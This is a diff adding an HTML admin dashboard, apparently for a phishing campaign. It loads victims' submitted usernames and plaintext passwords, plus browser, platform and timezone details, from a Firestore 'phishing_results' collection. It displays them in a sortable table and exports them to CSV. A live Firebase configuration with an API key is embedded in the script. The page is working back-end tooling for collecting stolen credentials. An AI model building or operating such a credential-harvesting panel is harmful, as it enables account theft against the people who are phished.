@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Phishing Test – Admin Dashboard</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0f1117;
+      --surface: #1a1d27;
+      --surface2: #21253a;
+      --border: #2e3348;
+      --accent: #4f8ef7;
+      --accent2: #f74f7a;
+      --green: #3dd68c;
+      --yellow: #f7c94f;
+      --text: #e2e6f0;
+      --muted: #6e7a96;
+      --card-r: 10px;
+    }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    /* ── HEADER ── */
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0 28px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .badge {
+      background: var(--accent2);
+      color: white;
+      font-size: 0.65rem;
+      font-weight: 800;
+      letter-spacing: .08em;
+      padding: 3px 7px;
+      border-radius: 4px;
+      text-transform: uppercase;
+    }
+    header h1 { font-size: 1rem; font-weight: 700; }
+
+    /* ── DASHBOARD ── */
+    #dashboard { padding: 24px 28px; }
+
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+    .stat-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--card-r);
+      padding: 18px 20px;
+    }
+    .stat-card .label {
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: .06em;
+      color: var(--muted);
+      margin-bottom: 6px;
+    }
+    .stat-card .value {
+      font-size: 2rem;
+      font-weight: 800;
+      line-height: 1;
+    }
+    .stat-card .sub {
+      font-size: 0.72rem;
+      color: var(--muted);
+      margin-top: 4px;
+    }
+    .stat-card.danger .value { color: var(--accent2); }
+    .stat-card.safe .value  { color: var(--green); }
+    .stat-card.warn .value  { color: var(--yellow); }
+    .stat-card.info .value  { color: var(--accent); }
+
+    /* ── TOOLBAR ── */
+    .toolbar {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    .toolbar input {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--text);
+      font-size: 0.85rem;
+      padding: 7px 12px;
+      width: 220px;
+      outline: none;
+    }
+    .toolbar input:focus { border-color: var(--accent); }
+    .toolbar button {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-size: 0.82rem;
+      padding: 7px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all .15s;
+    }
+    .toolbar button:hover { border-color: var(--accent); color: var(--accent); }
+    .toolbar button.danger:hover { border-color: var(--accent2); color: var(--accent2); }
+    .toolbar .ml-auto { margin-left: auto; }
+
+    /* ── TABLE ── */
+    .table-wrap {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--card-r);
+      overflow: hidden;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.82rem;
+    }
+    thead {
+      background: var(--surface2);
+      border-bottom: 1px solid var(--border);
+    }
+    th {
+      text-align: left;
+      padding: 11px 14px;
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: .05em;
+      color: var(--muted);
+      font-weight: 700;
+      cursor: pointer;
+      user-select: none;
+    }
+    th:hover { color: var(--text); }
+    th .sort-icon { margin-left: 4px; opacity: .4; }
+    th.sorted .sort-icon { opacity: 1; color: var(--accent); }
+
+    tbody tr {
+      border-bottom: 1px solid var(--border);
+      transition: background .1s;
+    }
+    tbody tr:last-child { border-bottom: none; }
+    tbody tr:hover { background: var(--surface2); }
+
+    td {
+      padding: 10px 14px;
+      color: var(--text);
+      max-width: 220px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    td.username { font-weight: 600; color: var(--accent); }
+    td.password { font-family: monospace; color: var(--accent2); }
+    td.time { color: var(--muted); font-size: 0.76rem; }
+
+    .empty-state {
+      padding: 40px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 0.88rem;
+    }
+
+    /* ── DETAIL MODAL ── */
+    #modal-bg {
+      display: none;
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,.65);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+    }
+    #modal-bg.show { display: flex; }
+    .modal {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--card-r);
+      padding: 28px;
+      width: 480px;
+      max-width: 95vw;
+      max-height: 85vh;
+      overflow-y: auto;
+    }
+    .modal h3 {
+      margin-bottom: 16px;
+      font-size: 1rem;
+      color: var(--accent);
+    }
+    .modal-row {
+      display: flex;
+      gap: 8px;
+      padding: 7px 0;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.82rem;
+    }
+    .modal-row:last-child { border-bottom: none; }
+    .modal-key {
+      color: var(--muted);
+      min-width: 110px;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: .04em;
+      padding-top: 2px;
+    }
+    .modal-val { word-break: break-all; }
+    .modal-val.pw { font-family: monospace; color: var(--accent2); }
+    .btn-close {
+      margin-top: 18px;
+      padding: 8px 20px;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      color: var(--text);
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.85rem;
+    }
+    .btn-close:hover { border-color: var(--accent); }
+
+    /* ── TOAST ── */
+    #toast {
+      position: fixed;
+      bottom: 24px; right: 24px;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      color: var(--green);
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-size: 0.82rem;
+      opacity: 0;
+      transition: opacity .25s;
+      pointer-events: none;
+    }
+    #toast.show { opacity: 1; }
+
+    #loading { text-align: center; padding: 40px; color: var(--muted); }
+  </style>
+</head>
+<body>
+
+<header>
+  <span class="badge">Admin</span>
+  <h1>Phishing Test Dashboard</h1>
+</header>
+
+<div id="dashboard">
+  <div class="stats-row">
+    <div class="stat-card danger">
+      <div class="label">Credentials Captured</div>
+      <div class="value" id="stat-total">–</div>
+      <div class="sub">total submissions</div>
+    </div>
+    <div class="stat-card warn">
+      <div class="label">Unique Users</div>
+      <div class="value" id="stat-unique">–</div>
+      <div class="sub">distinct usernames</div>
+    </div>
+    <div class="stat-card info">
+      <div class="label">Last Submission</div>
+      <div class="value" id="stat-last" style="font-size:1rem;line-height:1.4;margin-top:4px;">–</div>
+      <div class="sub">most recent</div>
+    </div>
+    <div class="stat-card safe">
+      <div class="label">Top Platform</div>
+      <div class="value" id="stat-platform" style="font-size:1rem;line-height:1.4;margin-top:4px;">–</div>
+      <div class="sub">OS / platform</div>
+    </div>
+  </div>
+
+  <div class="toolbar">
+    <input type="text" id="search" placeholder="Search username…" />
+    <button id="btn-refresh">↺ Refresh</button>
+    <button id="btn-export">↓ Export CSV</button>
+    <button class="danger ml-auto" id="btn-clear">🗑 Clear All</button>
+  </div>
+
+  <div class="table-wrap">
+    <div id="loading">Loading results…</div>
+    <table id="results-table" style="display:none">
+      <thead>
+        <tr>
+          <th data-col="username">Username <span class="sort-icon">▲</span></th>
+          <th data-col="password">Password <span class="sort-icon">▲</span></th>
+          <th data-col="timestamp">Time <span class="sort-icon">▲</span></th>
+          <th data-col="platform">Platform <span class="sort-icon">▲</span></th>
+          <th data-col="timezone">Timezone <span class="sort-icon">▲</span></th>
+          <th>Details</th>
+        </tr>
+      </thead>
+      <tbody id="tbody"></tbody>
+    </table>
+    <div id="empty-state" class="empty-state" style="display:none">
+      No submissions yet.
+    </div>
+  </div>
+</div>
+
+<div id="modal-bg">
+  <div class="modal">
+    <h3>Full Submission Details</h3>
+    <div id="modal-content"></div>
+    <button class="btn-close" id="btn-close-modal">Close</button>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+<script>
+// ── Firebase init ──
+const firebaseConfig = {
+  apiKey: "AIzaSyCAGtU1CxSESEE4JDHUimI8ZE2INneRx4M",
+  authDomain: "data-4a51e.firebaseapp.com",
+  projectId: "data-4a51e",
+  storageBucket: "data-4a51e.firebasestorage.app",
+  messagingSenderId: "404453773158",
+  appId: "1:404453773158:web:fc476ff3b130e2db52c2a7"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// ── State ──
+let allRows = [];
+let sortCol = 'timestamp';
+let sortAsc = false;
+
+// ── Load results on startup ──
+loadResults();
+
+async function loadResults() {
+  document.getElementById('loading').style.display = 'block';
+  document.getElementById('results-table').style.display = 'none';
+  document.getElementById('empty-state').style.display = 'none';
+
+  try {
+    const snap = await db.collection('phishing_results').orderBy('timestamp', 'desc').get();
+    allRows = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+    renderTable();
+    updateStats();
+  } catch (e) {
+    document.getElementById('loading').textContent = 'Error loading: ' + e.message;
+  }
+}
+
+function updateStats() {
+  document.getElementById('stat-total').textContent = allRows.length;
+  const unique = new Set(allRows.map(r => r.username)).size;
+  document.getElementById('stat-unique').textContent = unique;
+
+  if (allRows.length) {
+    const last = allRows[0];
+    const d = new Date(last.timestamp);
+    document.getElementById('stat-last').textContent =
+      d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
+  }
+
+  const platforms = allRows.map(r => r.platform || 'Unknown');
+  const freq = {};
+  platforms.forEach(p => freq[p] = (freq[p]||0)+1);
+  const top = Object.entries(freq).sort((a,b) => b[1]-a[1])[0];
+  document.getElementById('stat-platform').textContent = top ? top[0] : '–';
+}
+
+function renderTable() {
+  const query = document.getElementById('search').value.toLowerCase();
+  let rows = allRows.filter(r =>
+    !query || (r.username||'').toLowerCase().includes(query)
+  );
+
+  rows.sort((a, b) => {
+    let va = a[sortCol] || '', vb = b[sortCol] || '';
+    if (va < vb) return sortAsc ? -1 : 1;
+    if (va > vb) return sortAsc ? 1 : -1;
+    return 0;
+  });
+
+  document.getElementById('loading').style.display = 'none';
+
+  if (rows.length === 0) {
+    document.getElementById('results-table').style.display = 'none';
+    document.getElementById('empty-state').style.display = 'block';
+    return;
+  }
+
+  document.getElementById('results-table').style.display = 'table';
+  document.getElementById('empty-state').style.display = 'none';
+
+  const tbody = document.getElementById('tbody');
+  tbody.innerHTML = '';
+
+  rows.forEach(row => {
+    const tr = document.createElement('tr');
+    const ts = new Date(row.timestamp);
+    const timeStr = isNaN(ts) ? row.timestamp : ts.toLocaleString();
+
+    tr.innerHTML = `
+      <td class="username">${esc(row.username||'')}</td>
+      <td class="password">${esc(row.password||'')}</td>
+      <td class="time">${esc(timeStr)}</td>
+      <td>${esc(row.platform||'')}</td>
+      <td>${esc(row.timezone||'')}</td>
+      <td><button onclick="openModal('${row.id}')" style="background:var(--surface2);border:1px solid var(--border);color:var(--accent);font-size:.75rem;padding:4px 10px;border-radius:4px;cursor:pointer;">View</button></td>
+    `;
+    tbody.appendChild(tr);
+  });
+}
+
+function esc(str) {
+  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+document.querySelectorAll('th[data-col]').forEach(th => {
+  th.addEventListener('click', () => {
+    const col = th.dataset.col;
+    if (sortCol === col) sortAsc = !sortAsc;
+    else { sortCol = col; sortAsc = false; }
+    document.querySelectorAll('th').forEach(t => t.classList.remove('sorted'));
+    th.classList.add('sorted');
+    th.querySelector('.sort-icon').textContent = sortAsc ? '▲' : '▼';
+    renderTable();
+  });
+});
+
+document.getElementById('search').addEventListener('input', renderTable);
+document.getElementById('btn-refresh').addEventListener('click', loadResults);
+
+document.getElementById('btn-export').addEventListener('click', () => {
+  const headers = ['id','username','password','timestamp','userAgent','platform','language','screenRes','timezone','referrer'];
+  const lines = [headers.join(',')];
+  allRows.forEach(r => {
+    lines.push(headers.map(h => `"${(r[h]||'').toString().replace(/"/g,'""')}"`).join(','));
+  });
+  const blob = new Blob([lines.join('\n')], {type:'text/csv'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `phishing_results_${new Date().toISOString().split('T')[0]}.csv`;
+  a.click();
+  toast('CSV downloaded!');
+});
+
+document.getElementById('btn-clear').addEventListener('click', async () => {
+  if (!confirm('Delete ALL phishing results? This cannot be undone.')) return;
+  const snap = await db.collection('phishing_results').get();
+  const batch = db.batch();
+  snap.docs.forEach(d => batch.delete(d.ref));
+  await batch.commit();
+  allRows = [];
+  renderTable();
+  updateStats();
+  toast('All records deleted.');
+});
+
+function openModal(id) {
+  const row = allRows.find(r => r.id === id);
+  if (!row) return;
+  const content = document.getElementById('modal-content');
+  content.innerHTML = Object.entries(row).map(([k,v]) =>
+    `<div class="modal-row">
+       <div class="modal-key">${esc(k)}</div>
+       <div class="modal-val ${k==='password'?'pw':''}">${esc(String(v))}</div>
+     </div>`
+  ).join('');
+  document.getElementById('modal-bg').classList.add('show');
+}
+
+document.getElementById('btn-close-modal').addEventListener('click', () =>
+  document.getElementById('modal-bg').classList.remove('show')
+);
+document.getElementById('modal-bg').addEventListener('click', e => {
+  if (e.target === document.getElementById('modal-bg'))
+    document.getElementById('modal-bg').classList.remove('show');
+});
+
+function toast(msg) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 2500);
+}
+</script>
+</body>
+</html>
